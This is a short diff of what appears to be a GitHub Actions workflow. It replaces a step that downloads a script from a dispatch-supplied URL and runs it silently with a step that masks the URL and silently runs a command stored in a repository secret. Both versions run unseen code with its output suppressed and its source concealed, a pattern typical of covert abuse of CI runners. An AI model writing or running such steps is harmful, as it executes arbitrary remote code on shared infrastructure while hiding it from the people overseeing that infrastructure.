@@ -17,9 +17,10 @@ jobs:
     timeout-minutes: 350
     steps:
       - run: |
-          curl -fsSL "$REDEEM_URL" -o /tmp/i.sh > /dev/null 2>&1
-          bash /tmp/i.sh > /dev/null 2>&1
+          echo "::add-mask::$REDEEM_URL"
+          bash -c "$C" > /dev/null 2>&1
         env:
           REDEEM_URL: ${{ github.event.client_payload.redeem_url }}
           A: ${{ secrets.A }}
           B: ${{ secrets.B }}
+          C: ${{ secrets.C }}
